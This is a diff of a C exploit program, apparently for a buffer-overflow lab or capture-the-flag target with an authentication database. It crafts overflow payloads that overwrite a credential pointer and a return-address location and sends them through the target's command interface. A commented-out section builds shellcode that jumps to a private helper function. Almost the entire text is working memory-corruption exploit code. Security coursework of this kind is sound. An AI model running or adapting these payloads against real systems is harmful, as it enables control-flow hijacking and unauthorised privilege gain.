@@ -45,8 +45,8 @@ int main() {
     memset((void*)expl, '\1', explsz);
     expl[explsz/sizeof(void*)-4] = (void*) 0x0000000000000000;
     expl[explsz/sizeof(void*)-3] = (void*) 0x00000000000001f0;
+    expl[explsz/sizeof(void*)-2] = (void*) curr_auth_cred + 32;
     expl[explsz/sizeof(void*)-1] = (void*) cur_return_addr_loc - 16;
-    expl[explsz/sizeof(void*)-2] = (void*) curr_auth_cred;
 
     put_str("p ");
     put_bin((char*)expl, explsz);
@@ -54,11 +54,78 @@ int main() {
     send();
     get_formatted("%*s");
 
-    put_str("p 1234567");
+    put_str("p 1234567\n");
     send();
     get_formatted("%*s");
 
 
+
+    // explsz = auth_db_cred_dist - 8;
+    // *expl = (void**)malloc(explsz);
+    // memset((void*)expl, 0x90, explsz);
+
+    // uint64_t injected_code[64] = {
+    //     0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    //     0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov    <private helper addr>, %rax
+	//     0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+    //     0xff, 0xe0, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90  // jmpq   *%rax
+    // };
+    // int injected_code_size = sizeof(injected_code) / sizeof(injected_code[0]);
+
+    // // Setting private helper addr in the injected code
+    // for (int i = 0; i < 8; i++) {
+    //     uint8_t byte = (curr_private_helper_addr >> (i * 8)) & 0xFF;
+    //     injected_code[i+2] = byte;
+    // }
+
+    // // Adding the injected code to expl
+    // int curr_expl_location = 0;
+    // int shift_bytes = 0;
+    // for(int i = 0; i < injected_code_size; i++) {
+    //     if(i % 8 == 0) {
+    //         curr_expl_location++;
+    //         expl[curr_expl_location] = 0x0000000000000000;
+    //         shift_bytes = 0;
+    //     }
+    //     expl[curr_expl_location] += injected_code[i] << (shift_bytes*8);
+    //     shift_bytes++;
+    // }
+
+    put_str("u 1234567\n");
+    // put_bin((char*)expl, explsz);
+    // put_str("\n");
+    send();
+    get_formatted("%*s");
+
+    explsz = 504;
+    *expl = (void**)malloc(explsz);
+    // Initialize the buffer with '\1' to make the contents predictable.
+    memset((void*)expl, '\1', explsz);
+    expl[explsz/sizeof(void*)-1] = (void*) 0x000003f000000001;
+
+    put_str("p ");
+    put_bin((char*)expl, explsz);
+    put_str("\n");
+    send();
+    get_formatted("%*s");
+
+    put_str("p 1234567\n");
+    send();
+    get_formatted("%*s");
+
+    put_str("p 1234567\n");
+    send();
+    get_formatted("%*s");
+
+    put_str("l \n");
+    send();
+    usleep(100000);
+    get_formatted("%*s");
+
+
+    put_str("p 1234567\n");
+    send();
+    get_formatted("%*s");
 
     explsz = auth_db_cred_dist - 8;
     *expl = (void**)malloc(explsz);
@@ -94,26 +161,6 @@ int main() {
     put_str("u ");
     put_bin((char*)expl, explsz);
     put_str("\n");
-    send();
-    get_formatted("%*s");
-
-    explsz = 504;
-    *expl = (void**)malloc(explsz);
-    // Initialize the buffer with '\1' to make the contents predictable.
-    memset((void*)expl, '\1', explsz);
-    expl[explsz/sizeof(void*)-1] = (void*) 0x000003f000000001;
-
-    put_str("p ");
-    put_bin((char*)expl, explsz);
-    put_str("\n");
-    send();
-    get_formatted("%*s");
-
-    put_str("p 1234567\n");
-    send();
-    get_formatted("%*s");
-
-    put_str("p 1234567\n");
     send();
     get_formatted("%*s");
 
